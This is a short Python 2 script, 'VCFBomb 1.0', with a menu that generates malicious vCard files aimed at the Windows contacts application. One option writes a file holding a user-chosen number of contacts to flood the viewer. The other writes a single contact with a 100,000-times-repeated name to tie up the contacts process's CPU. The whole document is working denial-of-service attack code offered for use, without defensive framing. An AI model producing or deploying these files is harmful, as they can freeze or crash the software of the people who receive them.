def ManyContact(Size):
	print "Starting a VCF bomb " + Size +" times"
	FileOutput = open('ManyContact.vcf', 'w')
	for x in range(0,int(Size)):
		FileOutput.write("BEGIN:VCARD\n")
		FileOutput.write("N:;EcardBomb;;;\n")
		FileOutput.write("VERSION:2.1\n")
		FileOutput.write("END:VCARD\n")
	FileOutput.close()
	print "Done, card with many contacts generated named ManyContact.vcf"
def LargeCard():
	EcardBomb = "I_Have_A_Long_Name" * 100000
	FileOutput = open('LargeCard.vcf', 'w')
	FileOutput.write("BEGIN:VCARD\n")
	FileOutput.write("N:;" + EcardBomb + ";;;\n")
	FileOutput.write("VERSION:2.1\n")
	FileOutput.write("END:VCARD\n")
	FileOutput.close()
	print "Done, card with Large Contact Generated"

print "Welcome to VCFBomb 1.0"
print "1 - ManyContact Attack - Attempts to spam Windows contacts windows"
print "2 - LargeCard Attack - Creates a CPU loop using the Windows contacts process"
VCFOption = raw_input("Enter your selection: ")
if VCFOption == "1":
	VCFSize = raw_input("Enter VCF Length: ")
	ManyContact(VCFSize)
	exit()
if VCFOption == "2":
	LargeCard()
	exit()
else:
	print "Invalid option. Exiting.."
	exit()